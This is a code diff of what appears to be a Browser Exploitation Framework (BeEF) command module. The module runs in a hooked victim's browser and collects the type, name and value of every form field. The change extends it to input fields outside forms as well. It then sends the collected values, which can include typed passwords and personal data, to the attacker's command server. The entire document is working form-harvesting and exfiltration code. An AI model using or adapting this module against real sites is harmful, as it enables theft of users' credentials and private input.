@@ -6,22 +6,29 @@
 
 beef.execute(function() {
 
-	var form_data = new Array();
+	var input_values = new Array();
 
 	// loop through all forms
-	for (var f=0; f < document.forms.length; f++) {
+	var forms = document.forms;
+	for (var f=0; f < forms.length; f++) {
 		// store type,name,value for all input fields
-		for (var i=0; i < document.forms[f].elements.length; i++) {
-			form_data.push(new Array(document.forms[f].elements[i].type, document.forms[f].elements[i].name, document.forms[f].elements[i].value));
+		for (var i=0; i < forms[f].elements.length; i++) {
+			input_values.push(new Array(forms[f].elements[i].type, forms[f].elements[i].name, forms[f].elements[i].value));
 		}
 	}
 
-	// return form data
-	if (form_data.length) {
-		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+JSON.stringify(form_data));
+	// store type,name,value for all input fields outside of form elements
+	var inputs = document.getElementsByTagName('input');
+	for (var i=0; i < inputs.length; i++) {
+		input_values.push(new Array(inputs[i].type, inputs[i].name, inputs[i].value))
+	}
+
+	// return input field info
+	if (input_values.length) {
+		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+JSON.stringify(input_values.unique()));
 	// return if no input fields were found
 	} else {
-		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Could not find any forms on '+window.location);
+		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'error=Could not find any inputs fields on '+window.location);
 	}
 
 });
